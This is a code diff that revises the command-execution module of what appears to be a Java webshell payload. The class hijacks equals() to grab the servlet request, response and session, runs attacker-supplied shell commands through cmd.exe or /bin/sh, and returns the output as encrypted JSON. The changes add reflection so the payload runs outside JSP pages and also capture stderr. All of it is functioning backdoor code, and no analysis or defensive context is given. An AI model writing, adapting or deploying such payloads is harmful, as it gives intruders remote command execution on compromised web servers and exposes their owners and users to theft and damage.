@@ -12,45 +12,41 @@ import javax.servlet.ServletOutputStream;
 import javax.servlet.ServletRequest;
 import javax.servlet.ServletResponse;
 import javax.servlet.http.HttpSession;
-import javax.servlet.jsp.PageContext;
 
 public class Cmd {
    public static String cmd;
+   public static String path;
+   private static String status = "success";
    private ServletRequest Request;
    private ServletResponse Response;
    private HttpSession Session;
 
    public boolean equals(Object obj) {
-      PageContext page = (PageContext)obj;
-      this.Session = page.getSession();
-      this.Response = page.getResponse();
-      this.Request = page.getRequest();
-      page.getResponse().setCharacterEncoding("UTF-8");
       HashMap result = new HashMap();
-      boolean var12 = false;
+      boolean var11 = false;
 
       ServletOutputStream so = null;
       label77: {
          try {
-            var12 = true;
+            var11 = true;
+            this.fillContext(obj);
             result.put("msg", this.RunCMD(cmd));
-            result.put("status", "success");
-            var12 = false;
+            result.put("status", status);
+            var11 = false;
             break label77;
-         } catch (Exception var16) {
-            result.put("msg", var16.getMessage());
-            result.put("status", "success");
-            var12 = false;
+         } catch (Exception var15) {
+            result.put("msg", var15.getMessage());
+            result.put("status", "fail");
+            var11 = false;
          } finally {
-            if (var12) {
+            if (var11) {
                try {
                   so = this.Response.getOutputStream();
                   so.write(this.Encrypt(this.buildJson(result, true).getBytes("UTF-8")));
                   so.flush();
                   so.close();
-                  page.getOut().clear();
-               } catch (Exception var13) {
-                  var13.printStackTrace();
+               } catch (Exception var12) {
+                  var12.printStackTrace();
                }
 
             }
@@ -61,9 +57,8 @@ public class Cmd {
             so.write(this.Encrypt(this.buildJson(result, true).getBytes("UTF-8")));
             so.flush();
             so.close();
-            page.getOut().clear();
-         } catch (Exception var14) {
-            var14.printStackTrace();
+         } catch (Exception var13) {
+            var13.printStackTrace();
          }
 
          return true;
@@ -74,9 +69,8 @@ public class Cmd {
          so.write(this.Encrypt(this.buildJson(result, true).getBytes("UTF-8")));
          so.flush();
          so.close();
-         page.getOut().clear();
-      } catch (Exception var15) {
-         var15.printStackTrace();
+      } catch (Exception var14) {
+         var14.printStackTrace();
       }
 
       return true;
@@ -90,12 +84,20 @@ public class Cmd {
          if (System.getProperty("os.name").toLowerCase().indexOf("windows") >= 0) {
             p = Runtime.getRuntime().exec(new String[]{"cmd.exe", "/c", cmd});
          } else {
-            p = Runtime.getRuntime().exec(cmd);
+            p = Runtime.getRuntime().exec(new String[]{"/bin/sh", "-c", cmd});
          }
 
          BufferedReader br = new BufferedReader(new InputStreamReader(p.getInputStream(), "GB2312"));
 
-         for(String disr = br.readLine(); disr != null; disr = br.readLine()) {
+         String disr;
+         for(disr = br.readLine(); disr != null; disr = br.readLine()) {
+            result = result + disr + "\n";
+         }
+
+         br = new BufferedReader(new InputStreamReader(p.getErrorStream(), "GB2312"));
+
+         for(disr = br.readLine(); disr != null; disr = br.readLine()) {
+            status = "error";
             result = result + disr + "\n";
          }
 
@@ -152,5 +154,20 @@ public class Cmd {
 
       sb.append("}");
       return sb.toString();
+   }
+
+   private void fillContext(Object obj) throws Exception {
+      if (obj.getClass().getName().indexOf("PageContext") >= 0) {
+         this.Request = (ServletRequest)obj.getClass().getDeclaredMethod("getRequest").invoke(obj);
+         this.Response = (ServletResponse)obj.getClass().getDeclaredMethod("getResponse").invoke(obj);
+         this.Session = (HttpSession)obj.getClass().getDeclaredMethod("getSession").invoke(obj);
+      } else {
+         Map objMap = (Map)obj;
+         this.Session = (HttpSession)objMap.get("session");
+         this.Response = (ServletResponse)objMap.get("response");
+         this.Request = (ServletRequest)objMap.get("request");
+      }
+
+      this.Response.setCharacterEncoding("UTF-8");
    }
 }
